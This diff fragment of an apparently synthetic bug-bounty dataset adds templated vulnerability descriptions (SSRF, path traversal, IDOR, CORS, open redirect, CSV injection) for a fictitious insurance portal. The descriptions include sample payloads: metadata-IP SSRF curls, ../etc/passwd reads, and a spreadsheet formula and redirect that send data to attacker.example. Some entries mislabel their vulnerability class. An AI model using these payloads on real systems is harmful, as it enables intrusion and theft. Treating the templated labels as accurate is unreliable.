+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.silberkamm-insurance.foo/console/queue`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -7071,7 +7124,8 @@
           "offset": "6d 7h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.silberkamm-insurance.foo/import`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7189,7 +7243,8 @@
           "offset": "3d 23h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.silberkamm-insurance.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7356,7 +7411,8 @@
           "offset": "3d 22h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.silberkamm-insurance.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7528,7 +7584,8 @@
           "offset": "6d 21h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.silberkamm-insurance.foo/profile`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7639,7 +7696,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.silberkamm-insurance.foo/api/import`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7774,7 +7832,8 @@
           "offset": "3d 2h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.silberkamm-insurance.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7921,7 +7980,8 @@
           "offset": "3d 6h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.silberkamm-insurance.foo/admin/items`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -8061,7 +8121,8 @@
           "offset": "5d 11h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://portal.silberkamm-insurance.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8161,7 +8222,8 @@
           "offset": "5h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.silberkamm-insurance.foo/api/me`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8276,7 +8338,8 @@
           "offset": "4d 3h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.silberkamm-insurance.foo/v2/me`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8468,7 +8531,8 @@
           "offset": "8d 16h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.silberkamm-insurance.foo/api/v2/documents/`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8627,7 +8691,8 @@
           "offset": "9d 10h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.silberkamm-insurance.foo/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8719,7 +8784,8 @@
           "offset": "1d 18h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.silberkamm-insurance.foo/api/documents/`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8878,7 +8944,8 @@
           "offset": "8d 15h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.silberkamm-insurance.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9024,7 +9091,8 @@
           "offset": "5d 23h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.silberkamm-insurance.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9176,7 +9244,8 @@
           "offset": "10d 1h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.silberkamm-insurance.foo/profile`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9278,7 +9347,8 @@
           "offset": "1d 12h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.silberkamm-insurance.foo/api/me`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9386,7 +9456,8 @@
           "offset": "3d 2h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.silberkamm-insurance.foo/v2/me`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9511,7 +9582,8 @@
           "offset": "2d 4h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.silberkamm-insurance.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9630,7 +9702,8 @@
           "offset": "1d 6h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.silberkamm-insurance.foo/export?type=records`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9773,7 +9846,8 @@
           "offset": "4d 9h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.silberkamm-insurance.foo/api/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9896,7 +9970,8 @@
           "offset": "2d 16h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.silberkamm-insurance.foo/import`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10064,7 +10139,8 @@
           "offset": "3d 11h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.silberkamm-insurance.foo/api/documents/`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10211,7 +10287,8 @@
           "offset": "3d 4h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.silberkamm-insurance.foo/fetch`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10337,7 +10414,8 @@
           "offset": "2d 1h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.silberkamm-insurance.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10496,7 +10574,8 @@
           "offset": "5d 23h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.silberkamm-insurance.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10608,7 +10687,8 @@
           "offset": "3d 6h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://portal.silberkamm-insurance.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10723,7 +10803,8 @@
           "offset": "2h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.silberkamm-insurance.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10850,7 +10931,8 @@
           "offset": "4d 8h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.silberkamm-insurance.foo/export?type=records`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10946,7 +11028,8 @@
           "offset": "1d 20h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.silberkamm-insurance.foo/admin/items`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -11066,7 +11149,8 @@
           "offset": "2d 20h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
